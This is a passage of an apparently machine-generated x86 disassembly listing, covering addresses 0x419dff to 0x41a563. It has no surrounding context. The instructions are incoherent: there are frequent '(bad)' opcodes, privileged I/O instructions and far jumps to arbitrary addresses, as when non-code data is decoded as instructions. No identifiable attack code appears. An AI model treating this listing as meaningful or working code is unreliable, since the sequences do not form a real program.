  419dff:	jecxz  0x419e3e
  419e01:	jno    0x419e5b
  419e03:	mov    edi,0xcc2fe856
  419e08:	mov    al,ds:0xde3921bc
  419e0d:	mov    eax,DWORD PTR [ecx-0x6a]
  419e10:	retf   
  419e11:	and    ch,BYTE PTR [eax]
  419e13:	into   
  419e14:	mov    ds:0xbe4561ae,al
  419e19:	addr16 inc edx
  419e1b:	mov    edi,0x559d6453
  419e20:	pusha  
  419e21:	into   
  419e22:	mov    WORD PTR [edx],ss
  419e24:	xor    al,0x3e
  419e26:	jb     0x419e8f
  419e28:	int    0x9d
  419e2a:	adc    bh,bl
  419e2c:	or     bh,al
  419e2e:	and    eax,0x573a4e7b
  419e33:	mov    ebp,0x2e36ded7
  419e38:	scas   al,BYTE PTR es:[edi]
  419e39:	mov    bh,BYTE PTR [eax-0x65]
  419e3c:	sub    al,0xe9
  419e3e:	xchg   DWORD PTR [eax+0x61373fdd],esi
  419e44:	xor    al,0x63
  419e46:	int    0xf0
  419e48:	cmp    esi,DWORD PTR [ebx+eiz*2-0x56]
  419e4c:	dec    ecx
  419e4d:	shl    DWORD PTR [eax],cl
  419e4f:	push   es
  419e50:	inc    esp
  419e51:	out    dx,eax
  419e52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419e53:	push   eax
  419e54:	sub    al,0x6b
  419e56:	sub    al,0x8e
  419e58:	xchg   ebp,eax
  419e59:	clc    
  419e5a:	push   esp
  419e5b:	dec    ebx
  419e5c:	sahf   
  419e5d:	outs   dx,BYTE PTR ds:[esi]
  419e5e:	and    eax,0xbd91fb16
  419e63:	jno    0x419e2c
  419e65:	clc    
  419e66:	test   al,0xb7
  419e68:	sub    DWORD PTR [edi-0x73],edi
  419e6b:	dec    ecx
  419e6c:	xor    bh,BYTE PTR [ebp-0x5859be22]
  419e72:	adc    ebp,DWORD PTR [eax+0x7c]
  419e75:	push   ebp
  419e76:	xchg   BYTE PTR [edx-0x51],al
  419e79:	xchg   ebp,eax
  419e7a:	ins    DWORD PTR es:[edi],dx
  419e7b:	inc    ebx
  419e7c:	mov    ah,0xe2
  419e7e:	outs   dx,DWORD PTR ds:[esi]
  419e7f:	aad    0x5d
  419e81:	popa   
  419e82:	dec    esp
  419e83:	sbb    al,0x10
  419e85:	pop    ebx
  419e86:	scas   eax,DWORD PTR es:[edi]
  419e87:	add    eax,0x13fffd09
  419e8c:	dec    esi
  419e8d:	jae    0x419f02
  419e8f:	inc    ebx
  419e90:	or     edi,ecx
  419e92:	jp     0x419f02
  419e94:	inc    ebp
  419e95:	push   ebp
  419e96:	sti    
  419e97:	fld    st(5)
  419e99:	(bad)  
  419e9a:	leave  
  419e9b:	xchg   DWORD PTR [edi-0x63e7ae0d],ebx
  419ea1:	loop   0x419e4d
  419ea3:	test   al,0x8
  419ea5:	call   0xacf49ff0
  419eaa:	xchg   ebx,eax
  419eab:	sar    eax,cl
  419ead:	mov    dh,bl
  419eaf:	sub    dh,dh
  419eb1:	js     0x419ef0
  419eb3:	and    BYTE PTR [eax+0x39],bl
  419eb6:	add    bl,BYTE PTR [edx-0x5d]
  419eb9:	jp     0x419f27
  419ebb:	sti    
  419ebc:	fisttp WORD PTR [eax]
  419ebe:	ja     0x419ef4
  419ec0:	popa   
  419ec1:	push   esi
  419ec2:	mov    dl,0x4c
  419ec4:	jmp    0x6791:0xe0a4ea12
  419ecb:	mov    esp,0xc52c9537
  419ed0:	(bad)  
  419ed1:	in     al,dx
  419ed2:	in     al,dx
  419ed3:	inc    edx
  419ed4:	hlt    
  419ed5:	into   
  419ed6:	push   eax
  419ed7:	dec    edi
  419ed8:	mov    ecx,0xc05c8427
  419edd:	xor    eax,0x7c620d00
  419ee2:	loop   0x419f62
  419ee4:	pop    esi
  419ee5:	add    eax,0xa3123f11
  419eea:	or     DWORD PTR [eax],0xffffff95
  419eed:	add    BYTE PTR [eax],bl
  419eef:	or     BYTE PTR [ebx+0x64283bd8],cl
  419ef5:	test   al,0x81
  419ef7:	mov    al,0x0
  419ef9:	retf   
  419efa:	sbb    bh,BYTE PTR [ebx]
  419efc:	or     eax,0x5ea5abb7
  419f01:	mov    eax,DWORD PTR [edi-0x625f75e]
  419f07:	outs   dx,DWORD PTR ds:[esi]
  419f08:	(bad)  
  419f0a:	stos   DWORD PTR es:[edi],eax
  419f0b:	pop    ds
  419f0c:	pop    ss
  419f0d:	imul   ecx,esp,0x33
  419f10:	out    0xf6,al
  419f12:	adc    dh,BYTE PTR [ebx+eax*2-0x3e]
  419f16:	xlat   BYTE PTR ds:[ebx]
  419f17:	mov    ah,0xb2
  419f19:	sbb    al,0x35
  419f1b:	xchg   ecx,eax
  419f1c:	js     0x419f2b
  419f1e:	(bad)  
  419f20:	mov    al,0x32
  419f22:	jle    0x419f91
  419f24:	jp     0x419ebe
  419f26:	retf   0x3a5f
  419f29:	fidivr WORD PTR [ebp+0x2a]
  419f2c:	retf   
  419f2d:	jg     0x419ee3
  419f2f:	int3   
  419f30:	(bad)  
  419f31:	ficomp DWORD PTR [ecx+0xf]
  419f34:	fnstsw WORD PTR [esi]
  419f36:	popf   
  419f37:	daa    
  419f38:	add    eax,0x8b43f55f
  419f3d:	adc    DWORD PTR [edi],0x525fb356
  419f43:	sar    BYTE PTR [edx+0x4728bf2a],cl
  419f49:	das    
  419f4a:	and    eax,0xea704d89
  419f4f:	add    eax,0xb6406abc
  419f54:	pop    edx
  419f55:	(bad)  
  419f56:	es in  eax,0xaa
  419f59:	xchg   DWORD PTR [edi+0x9],eax
  419f5c:	xlat   BYTE PTR ds:[ebx]
  419f5d:	fwait
  419f5e:	test   DWORD PTR [edi+0x5a],edx
  419f61:	les    ebx,FWORD PTR [edx-0xa]
  419f64:	xchg   DWORD PTR [ebx],eax
  419f66:	in     al,0x24
  419f68:	sti    
  419f69:	and    DWORD PTR [edx+ebx*2-0xc],edi
  419f6d:	jo     0x419f04
  419f6f:	icebp  
  419f70:	xor    DWORD PTR [eax+ebx*4-0x5771a4f4],edx
  419f77:	ret    
  419f78:	(bad)  
  419f7a:	rcpps  xmm7,XMMWORD PTR [edi-0x11fbf7e3]
  419f81:	imul   DWORD PTR [edx-0x58f3da44]
  419f87:	scas   al,BYTE PTR es:[edi]
  419f88:	clc    
  419f89:	ret    
  419f8a:	repnz (bad) 
  419f8c:	push   ecx
  419f8d:	pop    ebp
  419f8e:	loop   0x419fb9
  419f90:	ds dec ebx
  419f92:	xor    DWORD PTR [edx-0x34],0x9b5f6334
  419f99:	mov    gs,WORD PTR [esi]
  419f9b:	adc    al,0xe4
  419f9d:	pavgb  mm4,mm2
  419fa0:	cmp    al,0x40
  419fa2:	out    0x8a,al
  419fa4:	or     al,0x2
  419fa6:	dec    eax
  419fa7:	fisttp WORD PTR ds:0xf4a3bfbc
  419fad:	mov    dl,0x7
  419faf:	inc    edi
  419fb0:	mov    bh,0x90
  419fb2:	inc    ebx
  419fb3:	jno    0x419fbd
  419fb5:	inc    edi
  419fb6:	lea    ecx,[ebp+0x2c]
  419fb9:	inc    ecx
  419fba:	in     al,0xdb
  419fbc:	sar    DWORD PTR [ecx+edx*4-0x4f8e15b9],cl
  419fc3:	cmp    BYTE PTR [edx-0x40],0x65
  419fc7:	rcr    cl,0xbb
  419fca:	add    ecx,DWORD PTR [ebx-0x4e]
  419fcd:	dec    eax
  419fce:	sbb    dh,BYTE PTR [ebx]
  419fd0:	pop    ebp
  419fd1:	test   edx,ebp
  419fd3:	icebp  
  419fd4:	adc    dh,BYTE PTR [ecx-0x2fbece0f]
  419fda:	sar    ebp,cl
  419fdc:	jg     0x419fb5
  419fde:	jg     0x419fc7
  419fe0:	add    edi,DWORD PTR [edx+0x7d]
  419fe3:	rcr    DWORD PTR [edi-0x199e25b],cl
  419fe9:	mov    dl,al
  419feb:	jbe    0x41a04f
  419fed:	jbe    0x419fe1
  419fef:	pop    ds
  419ff0:	(bad)  
  419ff2:	fwait
  419ff3:	retf   0xc76b
  419ff6:	loope  0x41a03d
  419ff8:	pop    es
  419ff9:	pop    edx
  419ffa:	les    edx,FWORD PTR [ebx+0xe]
  419ffd:	in     al,dx
  419ffe:	pop    ebx
  419fff:	add    DWORD PTR [ebx-0x4564bb0b],ebp
  41a005:	and    BYTE PTR [eax+0x37],bh
  41a008:	jns    0x419fcc
  41a00a:	pop    eax
  41a00b:	arpl   WORD PTR [edx+0x71],ax
  41a00e:	mov    al,BYTE PTR [esi+0x3b4caec1]
  41a014:	push   esi
  41a015:	jmp    0x8199:0x1400a37d
  41a01c:	dec    esi
  41a01d:	mov    eax,ds:0x3c57e068
  41a022:	pop    DWORD PTR [eax+ecx*1-0x64]
  41a026:	add    al,0x68
  41a028:	or     ch,BYTE PTR ds:[ecx+0x799ec4dd]
  41a02f:	pop    ecx
  41a030:	pop    edx
  41a031:	or     ebx,DWORD PTR [edx-0x4e7bfdb9]
  41a037:	mov    al,0x4f
  41a039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a03a:	xchg   DWORD PTR [eax+0x51],ecx
  41a03d:	call   0xa5e28e6b
  41a042:	or     cl,dh
  41a044:	or     ecx,DWORD PTR fs:[ebx+0x27]
  41a048:	ds iret 
  41a04a:	ficom  DWORD PTR [eax]
  41a04c:	push   edi
  41a04d:	not    DWORD PTR [esi-0xe04a950]
  41a053:	aam    0x8f
  41a055:	ins    BYTE PTR es:[edi],dx
  41a056:	repz cdq 
  41a058:	popw   es
  41a05a:	clc    
  41a05b:	imul   ebp,edi,0x49
  41a05e:	xchg   DWORD PTR [edx+0x578c7d4a],ebp
  41a064:	pop    ds
  41a065:	(bad)  
  41a066:	mov    al,0x67
  41a068:	js     0x41a032
  41a06a:	ret    
  41a06b:	mov    ds:0xcedd5b70,eax
  41a070:	dec    ecx
  41a071:	dec    edx
  41a072:	shl    BYTE PTR [ebp+0x509e63c5],1
  41a078:	cs (bad) 
  41a07b:	imul   edi,eax,0xffffffc0
  41a07e:	pop    ds
  41a07f:	stc    
  41a080:	xor    BYTE PTR [ebp+0x73c6449],al
  41a086:	aam    0x94
  41a088:	lods   al,BYTE PTR ds:[esi]
  41a089:	cmp    BYTE PTR [ecx-0x58],al
  41a08c:	and    BYTE PTR [edi],cl
  41a08e:	mov    ch,0x9e
  41a090:	adc    DWORD PTR [esi+0x75b32e82],0x38
  41a097:	mov    edx,0x6c7a3ebe
  41a09c:	push   edi
  41a09d:	sub    cl,bl
  41a09f:	jp     0x41a0fc
  41a0a1:	daa    
  41a0a2:	scas   al,BYTE PTR es:[edi]
  41a0a3:	pop    esp
  41a0a4:	mov    edx,0x1e915276
  41a0a9:	push   eax
  41a0aa:	and    dh,BYTE PTR ds:[eax+0x4f]
  41a0ae:	xchg   ecx,eax
  41a0af:	inc    esp
  41a0b0:	mov    al,0xa
  41a0b2:	lock mov al,ds:0xad6cdebc
  41a0b8:	out    0x25,al
  41a0ba:	jmp    0xb137:0xd1593f3e
  41a0c1:	sub    DWORD PTR [esi+0x1f],0xaef31e45
  41a0c8:	(bad)  
  41a0c9:	int    0x3e
  41a0cb:	mov    ds:0x18ae827b,eax
  41a0d0:	ins    DWORD PTR es:[edi],dx
  41a0d1:	out    dx,al
  41a0d2:	mov    edi,0x10c473de
  41a0d7:	ja     0x41a086
  41a0d9:	mov    ah,0xcb
  41a0db:	ret    
  41a0dc:	and    eax,0x1dbc2853
  41a0e1:	mov    esi,0xf60bed33
  41a0e6:	nop
  41a0e7:	imul   ebx,DWORD PTR [esi+0x13348a90],0xffffff91
  41a0ee:	mov    esp,cs
  41a0f0:	dec    ebp
  41a0f1:	adc    DWORD PTR [esi-0x4e74199f],edi
  41a0f7:	shl    dh,1
  41a0f9:	push   ebx
  41a0fa:	int3   
  41a0fb:	je     0x41a0a5
  41a0fd:	dec    dh
  41a0ff:	rcr    cl,cl
  41a101:	in     eax,0x9
  41a103:	jno    0x41a15f
  41a105:	pusha  
  41a106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a107:	jmp    0xca1b:0xc94d232
  41a10e:	push   esi
  41a10f:	imul   ebx,DWORD PTR [esi-0x77d16e5c],0xffffffaa
  41a116:	je     0x41a171
  41a118:	sub    BYTE PTR [esi],dl
  41a11a:	lock inc esi
  41a11c:	fidiv  WORD PTR [edx+0x7617e50b]
  41a122:	fwait
  41a123:	in     eax,dx
  41a124:	dec    edx
  41a125:	ins    BYTE PTR es:[edi],dx
  41a126:	rcr    BYTE PTR [edx],0xee
  41a129:	pop    ebp
  41a12a:	dec    esp
  41a12b:	cmp    al,0x70
  41a12d:	xchg   BYTE PTR [ecx],ah
  41a12f:	sub    BYTE PTR [ecx+ebp*2+0x7e],0xb6
  41a134:	jmp    0x913f919e
  41a139:	scas   eax,DWORD PTR es:[edi]
  41a13a:	cmp    BYTE PTR [ebx],bh
  41a13c:	or     BYTE PTR [edi-0x71d16efb],dh
  41a142:	or     al,0xd3
  41a144:	jl     0x41a187
  41a146:	gs (bad) 
  41a148:	push   ebx
  41a149:	sar    BYTE PTR [edi+0xf],cl
  41a14c:	hlt    
  41a14d:	dec    esi
  41a14e:	(bad)  
  41a14f:	push   0x14
  41a151:	imul   BYTE PTR [esp+eiz*8-0x23b53f36]
  41a158:	pop    ebp
  41a159:	sbb    BYTE PTR [ebp+0x54ed669a],ch
  41a15f:	jne    0x41a102
  41a161:	push   ds
  41a162:	ins    BYTE PTR es:[edi],dx
  41a163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a164:	sbb    eax,DWORD PTR [ebx-0x45]
  41a167:	stos   DWORD PTR es:[edi],eax
  41a168:	pushf  
  41a169:	inc    esi
  41a16a:	hlt    
  41a16b:	iret   
  41a16c:	push   ebx
  41a16d:	cwde   
  41a16e:	(bad)  
  41a16f:	shr    BYTE PTR [esi+0x2e],1
  41a172:	jge    0x41a114
  41a174:	sbb    bl,BYTE PTR [ebp-0x63]
  41a177:	jae    0x41a1d7
  41a179:	or     al,0xa9
  41a17b:	(bad)  [esi+edx*1+0x415b58ec]
  41a182:	lea    esi,[eax-0x2]
  41a185:	icebp  
  41a186:	retf   0x99ae
  41a189:	mov    bh,0xa3
  41a18b:	adc    al,0xee
  41a18d:	xchg   esi,eax
  41a18e:	sbb    DWORD PTR [ebx-0x333d810],esp
  41a194:	loope  0x41a18b
  41a196:	cmp    DWORD PTR [edx],ebp
  41a198:	stos   DWORD PTR es:[edi],eax
  41a199:	neg    BYTE PTR [edi+edi*8-0x469d98dc]
  41a1a0:	lock push esp
  41a1a2:	ror    BYTE PTR [ecx-0x24db1f38],cl
  41a1a8:	dec    ebx
  41a1a9:	mov    bh,0x1f
  41a1ab:	je     0x41a1fe
  41a1ad:	inc    ecx
  41a1ae:	push   ds
  41a1af:	sbb    esp,esi
  41a1b1:	dec    ebp
  41a1b2:	xchg   BYTE PTR [edx+0x20a2b50],cl
  41a1b8:	pop    esp
  41a1b9:	sub    DWORD PTR [ebp+0x47],ebp
  41a1bc:	xor    dl,BYTE PTR [edx]
  41a1be:	inc    ebx
  41a1bf:	inc    ecx
  41a1c0:	mov    WORD PTR [edx],cs
  41a1c2:	pop    edi
  41a1c3:	xchg   esp,eax
  41a1c4:	popf   
  41a1c5:	add    ah,BYTE PTR [edx]
  41a1c7:	mov    dh,0x57
  41a1c9:	fdiv   DWORD PTR ds:0x2bb84ff1
  41a1cf:	(bad)  
  41a1d0:	rcl    BYTE PTR [ecx-0x4dbd74d],0x12
  41a1d7:	xchg   BYTE PTR [esi+0x49],bl
  41a1da:	jnp    0x41a217
  41a1dc:	xchg   esp,eax
  41a1dd:	sbb    DWORD PTR [edi],eax
  41a1df:	das    
  41a1e0:	call   0x43ce:0xaaa368ed
  41a1e7:	mov    ebx,0xa9e81589
  41a1ec:	add    BYTE PTR [ecx],dh
  41a1ee:	jge    0x41a191
  41a1f0:	ja     0x41a253
  41a1f2:	call   0x2ca3:0x73954972
  41a1f9:	pop    ebx
  41a1fa:	psubsb mm1,QWORD PTR [esi-0x69]
  41a1fe:	mov    ebp,0x98140567
  41a203:	(bad)  
  41a204:	mov    ah,0x41
  41a206:	ss cmc 
  41a208:	sbb    cl,ch
  41a20a:	in     al,dx
  41a20b:	add    ecx,DWORD PTR [ebx+0x58fcc387]
  41a211:	inc    eax
  41a212:	test   bl,dh
  41a214:	in     eax,0x7f
  41a216:	mov    edi,0xdfb6e15f
  41a21b:	outs   dx,DWORD PTR ds:[esi]
  41a21c:	add    al,bh
  41a21e:	loop   0x41a1ff
  41a220:	or     al,0x75
  41a222:	sbb    al,0x5d
  41a224:	xchg   esi,eax
  41a225:	xlat   BYTE PTR ds:[ebx]
  41a226:	dec    eax
  41a227:	sahf   
  41a228:	nop
  41a229:	(bad)  
  41a22a:	sub    BYTE PTR [ebx+0x41],bl
  41a22d:	sbb    esi,ebp
  41a22f:	cmc    
  41a230:	sti    
  41a231:	mov    cl,0x7e
  41a233:	js     0x41a2ab
  41a235:	jle    0x41a215
  41a237:	pop    esi
  41a238:	xchg   DWORD PTR ds:0xacbb795b,edi
  41a23e:	cmp    esi,DWORD PTR ds:0xd1751f41
  41a244:	sti    
  41a245:	into   
  41a246:	(bad)  
  41a247:	clc    
  41a248:	mov    ds:0xafc3abba,al
  41a24d:	dec    esp
  41a24e:	daa    
  41a24f:	sbb    DWORD PTR [edi+0x78178e23],ecx
  41a255:	add    DWORD PTR [ecx-0x43],ebx
  41a258:	scas   eax,DWORD PTR es:[edi]
  41a259:	std    
  41a25a:	sub    al,0x7e
  41a25c:	mov    esp,0x940370b
  41a261:	repnz mov ss,WORD PTR [eax-0xe]
  41a265:	pop    ebp
  41a266:	xor    eax,0xae59adbd
  41a26b:	push   edi
  41a26c:	cmp    al,0x3e
  41a26e:	je     0x41a28b
  41a270:	ret    0x202
  41a273:	sub    ebp,DWORD PTR [edi]
  41a275:	xchg   ebp,eax
  41a276:	das    
  41a277:	scas   eax,DWORD PTR es:[edi]
  41a278:	dec    ecx
  41a279:	bnd jmp 0x4459b5cf
  41a27f:	add    DWORD PTR [eax+ebx*4],eax
  41a282:	mov    eax,ds:0x8f45e9e5
  41a287:	sbb    ebp,DWORD PTR [edi+0x701b8dc4]
  41a28d:	cmc    
  41a28e:	or     BYTE PTR [ebx+0x2a20ded1],dh
  41a294:	fistp  WORD PTR [ebx+edx*8-0x55953dc2]
  41a29b:	jo     0x41a30c
  41a29d:	repnz pop esi
  41a29f:	jne    0x41a2c3
  41a2a1:	repnz out 0x8b,eax
  41a2a4:	mov    ds:0x54b2baaf,eax
  41a2a9:	ds jb  0x41a2c9
  41a2ac:	push   0xca4ba8bc
  41a2b1:	in     eax,0xd7
  41a2b3:	pop    ebx
  41a2b4:	xlat   BYTE PTR ds:[ebx]
  41a2b5:	mov    al,0xcd
  41a2b7:	cs add eax,0x803097fe
  41a2bd:	jns    0x41a2c5
  41a2bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2c0:	inc    DWORD PTR [ebx]
  41a2c2:	jae    0x41a2d8
  41a2c4:	push   ds
  41a2c5:	pop    es
  41a2c6:	sbb    eax,0xdf85ea8f
  41a2cb:	ds sti 
  41a2cd:	pop    esi
  41a2ce:	aam    0x34
  41a2d0:	mov    cl,0xf4
  41a2d2:	pusha  
  41a2d3:	arpl   WORD PTR [ecx-0x534b5f1b],sp
  41a2d9:	ror    BYTE PTR ds:0xc6633983,0x49
  41a2e0:	je     0x41a334
  41a2e2:	jle    0x41a2e4
  41a2e4:	stos   BYTE PTR es:[edi],al
  41a2e5:	loop   0x41a2ba
  41a2e7:	test   BYTE PTR [ebx+0xc],0xda
  41a2eb:	rol    BYTE PTR [esi],0xd8
  41a2ee:	stc    
  41a2ef:	imul   ebx,DWORD PTR [esi+0x57],0x2b
  41a2f3:	sar    ah,cl
  41a2f5:	push   esp
  41a2f6:	pop    ebp
  41a2f7:	pop    edi
  41a2f8:	jmp    0xe2ae249
  41a2fd:	sbb    DWORD PTR [eax],ebx
  41a2ff:	repnz push esp
  41a301:	jp     0x41a381
  41a303:	sbb    ecx,ecx
  41a305:	loop   0x41a358
  41a307:	test   DWORD PTR [edi+0x4eac2cab],esp
  41a30d:	das    
  41a30e:	or     al,0x3f
  41a310:	push   ebp
  41a311:	mov    esi,0x1c2314b2
  41a316:	xchg   ecx,eax
  41a317:	popf   
  41a318:	jnp    0x41a310
  41a31a:	xchg   esp,eax
  41a31b:	push   ds
  41a31c:	push   es
  41a31d:	sar    DWORD PTR [esi+0x1f],0xb8
  41a321:	add    DWORD PTR [ebx],0xffffff99
  41a324:	ja     0x41a309
  41a326:	repz jmp 0x41a320
  41a329:	push   ds
  41a32a:	inc    ebx
  41a32b:	aad    0x20
  41a32d:	out    dx,eax
  41a32e:	xchg   esi,eax
  41a32f:	sar    BYTE PTR [eax],0xed
  41a332:	addr16 jbe 0x41a2f1
  41a335:	dec    edx
  41a336:	outs   dx,BYTE PTR ds:[esi]
  41a337:	inc    eax
  41a338:	dec    edi
  41a339:	pop    ecx
  41a33a:	fwait
  41a33b:	gs sti 
  41a33d:	xor    eax,0x7a28886
  41a342:	into   
  41a343:	mov    DWORD PTR [eax+0x6b],ebp
  41a346:	lods   eax,DWORD PTR ds:[esi]
  41a347:	dec    ecx
  41a348:	jnp    0x41a3a5
  41a34a:	mov    dh,0xc8
  41a34c:	nop
  41a34d:	jmp    0x41a39a
  41a34f:	into   
  41a350:	mov    ebx,0xb6103750
  41a355:	mov    ?,WORD PTR [esi]
  41a357:	aam    0xf1
  41a359:	mov    cl,0x27
  41a35b:	pop    edi
  41a35c:	in     al,dx
  41a35d:	(bad)
  41a361:	(bad)  
  41a363:	dec    ebp
  41a364:	mov    ds:0xe4a9682d,eax
  41a369:	gs ins BYTE PTR es:[edi],dx
  41a36b:	and    DWORD PTR [edx+0x7c],0x778ede15
  41a372:	(bad)  
  41a373:	in     al,dx
  41a374:	int    0x18
  41a376:	push   ebx
  41a377:	add    DWORD PTR [edx*1+0x6eb25190],ecx
  41a37e:	and    bl,bh
  41a380:	push   ss
  41a381:	setb   BYTE PTR [edx]
  41a384:	dec    ecx
  41a385:	xchg   ebx,eax
  41a386:	jle    0x41a350
  41a388:	push   ecx
  41a389:	mov    dh,0x72
  41a38b:	fs cmp eax,0x107047c3
  41a391:	inc    eax
  41a392:	adc    esi,DWORD PTR [edi-0x1b]
  41a395:	test   eax,0x1739840
  41a39a:	out    0xce,eax
  41a39c:	jno    0x41a32f
  41a39e:	mov    dl,0x4e
  41a3a0:	outs   dx,BYTE PTR ds:[esi]
  41a3a1:	cli    
  41a3a2:	and    al,0xa6
  41a3a4:	neg    eax
  41a3a6:	neg    DWORD PTR [edi-0x2a0a1a87]
  41a3ac:	add    ebp,edx
  41a3ae:	jbe    0x41a402
  41a3b0:	cli    
  41a3b1:	aas    
  41a3b2:	pop    edx
  41a3b3:	xor    BYTE PTR [esp+ebp*2],ah
  41a3b6:	out    dx,eax
  41a3b7:	test   eax,0xcb4172b5
  41a3bc:	outs   dx,DWORD PTR ds:[esi]
  41a3bd:	aaa    
  41a3be:	hlt    
  41a3bf:	dec    ebp
  41a3c0:	xchg   BYTE PTR [edx-0x63],cl
  41a3c3:	pop    ebp
  41a3c4:	dec    esi
  41a3c5:	xor    eax,0x3ba85155
  41a3ca:	and    eax,DWORD PTR [edi]
  41a3cc:	fwait
  41a3cd:	cmp    BYTE PTR [edi+edx*1],dl
  41a3d0:	mov    bh,0xa1
  41a3d2:	lahf   
  41a3d3:	cmp    edx,eax
  41a3d5:	imul   ebp,esi,0x76
  41a3d8:	test   ebx,0xfff542c7
  41a3de:	xchg   ebp,eax
  41a3df:	mov    dl,0xb0
  41a3e1:	mov    edi,0x221bd6e
  41a3e6:	mov    es,WORD PTR [esi+edi*4]
  41a3e9:	test   BYTE PTR [edx+0x74],cl
  41a3ec:	dec    esp
  41a3ed:	push   fs
  41a3ef:	aas    
  41a3f0:	ss scas eax,DWORD PTR es:[edi]
  41a3f2:	scas   eax,DWORD PTR es:[edi]
  41a3f3:	add    DWORD PTR [eax-0x6a],esi
  41a3f6:	push   edi
  41a3f7:	and    DWORD PTR [ebp+0x3e],0xffffffa5
  41a3fb:	jo     0x41a422
  41a3fd:	daa    
  41a3fe:	imul   BYTE PTR [edi-0x4d9f66c5]
  41a404:	jmp    0xc711a79c
  41a409:	scas   al,BYTE PTR es:[edi]
  41a40a:	call   FWORD PTR [esi]
  41a40c:	xchg   bl,dl
  41a40e:	push   ebp
  41a40f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a410:	cmp    edx,ebx
  41a412:	xchg   edx,eax
  41a413:	inc    BYTE PTR [esi+ebx*4]
  41a416:	aam    0xa2
  41a418:	gs cwde 
  41a41a:	xchg   ebp,eax
  41a41b:	pushf  
  41a41c:	jae    0x41a475
  41a41e:	jp     0x41a3b2
  41a420:	push   0xfffffff5
  41a422:	jg     0x41a499
  41a424:	pop    edi
  41a425:	adc    al,BYTE PTR [eax+eax*1]
  41a428:	push   esp
  41a429:	daa    
  41a42a:	sti    
  41a42b:	js     0x41a3ca
  41a42d:	push   0xb99978cf
  41a432:	(bad)
  41a435:	mov    dl,0xd3
  41a437:	mov    edx,0xba7dae73
  41a43c:	pop    ebx
  41a43d:	jmp    0xbeea41ab
  41a442:	adc    ebx,eax
  41a444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a445:	fild   WORD PTR [ecx]
  41a447:	or     ebx,edi
  41a449:	into   
  41a44a:	dec    edx
  41a44b:	in     eax,dx
  41a44c:	push   0x3eaced09
  41a451:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a452:	inc    eax
  41a453:	cwde   
  41a454:	jae    0x41a42d
  41a456:	fistp  WORD PTR [esi+edi*4-0x7d]
  41a45a:	jmp    DWORD PTR [esi+ebx*2-0x1f]
  41a45e:	in     al,dx
  41a45f:	(bad)  
  41a460:	(bad)  
  41a461:	mov    dl,0x59
  41a463:	cmp    eax,0xc5426871
  41a468:	pop    ecx
  41a469:	icebp  
  41a46a:	xchg   BYTE PTR [ebx],al
  41a46c:	xor    edi,esp
  41a46e:	(bad)  
  41a46f:	fimul  DWORD PTR [ebp-0xd]
  41a472:	fmul   DWORD PTR [esi+ecx*2-0x19]
  41a476:	mov    si,WORD PTR [ebx-0x274dda49]
  41a47d:	int3   
  41a47e:	fisub  WORD PTR [eax]
  41a480:	out    0xc1,al
  41a482:	(bad)  
  41a483:	push   0xfffffffe
  41a485:	mov    ?,WORD PTR [esi+0x18060bd6]
  41a48b:	fistp  WORD PTR [edx+0x74991835]
  41a491:	shr    DWORD PTR [edi],0xcd
  41a494:	out    dx,al
  41a495:	xor    BYTE PTR [eax],cl
  41a497:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a498:	and    eax,0x7d62c638
  41a49d:	mov    ?,edi
  41a49f:	addr16 jg 0x41a426
  41a4a2:	lods   eax,DWORD PTR ds:[esi]
  41a4a3:	les    esp,FWORD PTR [edi-0x90b02d2]
  41a4a9:	mov    esi,0xecdfabc6
  41a4ae:	push   ebp
  41a4af:	fcom   QWORD PTR [edx]
  41a4b1:	xor    ebp,ebx
  41a4b3:	mov    ds,WORD PTR [ebp+0x750239d5]
  41a4b9:	fnsave [ebp+0x227ea5b]
  41a4bf:	jge    0x41a478
  41a4c1:	mov    DWORD PTR [ebx],edi
  41a4c3:	popf   
  41a4c4:	mov    al,ds:0xd2520dac
  41a4c9:	cdq    
  41a4ca:	sahf   
  41a4cb:	xchg   esp,eax
  41a4cc:	imul   edi,DWORD PTR [edi+0x28f50ce5],0x37fa793e
  41a4d6:	pop    ds
  41a4d7:	sbb    BYTE PTR [edi-0x54],ch
  41a4da:	push   edi
  41a4db:	in     eax,dx
  41a4dc:	popf   
  41a4dd:	ss neg bh
  41a4e0:	jbe    0x41a4a7
  41a4e2:	jnp    0x41a4d1
  41a4e4:	out    dx,al
  41a4e5:	mov    cl,0x3
  41a4e7:	ret    0x7dbb
  41a4ea:	fwait
  41a4eb:	jmp    0xa41ef73a
  41a4f0:	pop    edx
  41a4f1:	cwde   
  41a4f2:	xor    al,0xd9
  41a4f5:	or     al,0x26
  41a4f7:	cdq    
  41a4f8:	mov    ebx,0xdddd9c46
  41a4fd:	jbe    0x41a54e
  41a4ff:	sub    edx,DWORD PTR [esi]
  41a501:	sub    DWORD PTR [ebx-0x5a],ecx
  41a504:	repz lock js 0x41a4c8
  41a508:	int    0x6f
  41a50a:	pusha  
  41a50b:	pop    esp
  41a50c:	std    
  41a50d:	fsubr  QWORD PTR ds:0xe8807e89
  41a513:	add    esp,DWORD PTR [si+0x6596]
  41a518:	mov    esi,0x1df4724d
  41a51d:	jecxz  0x41a4a0
  41a51f:	pushw  0x61
  41a522:	add    edi,DWORD PTR [edi+0x400fb508]
  41a528:	test   eax,0x87a93385
  41a52d:	sahf   
  41a52e:	adc    eax,0x13bbca62
  41a533:	dec    edi
  41a534:	push   esp
  41a535:	sbb    eax,0xec087ae6
  41a53a:	sti    
  41a53b:	dec    eax
  41a53c:	stos   BYTE PTR es:[edi],al
  41a53d:	xchg   esp,eax
  41a53e:	out    dx,eax
  41a53f:	adc    DWORD PTR [ebx+esi*4-0x2df3c928],ecx
  41a546:	mov    ebx,0x9fb8b6b8
  41a54b:	push   ecx
  41a54c:	push   esi
  41a54d:	icebp  
  41a54e:	mov    ch,0x4e
  41a550:	aas    
  41a551:	aaa    
  41a552:	jns    0x41a5c5
  41a554:	outs   dx,BYTE PTR ds:[esi]
  41a555:	adc    eax,0x74a462dd
  41a55a:	jmp    0xa88e9e9a
  41a55f:	cmp    BYTE PTR [edi],bl
  41a561:	jecxz  0x41a55b
  41a563:	xor    cl,cl
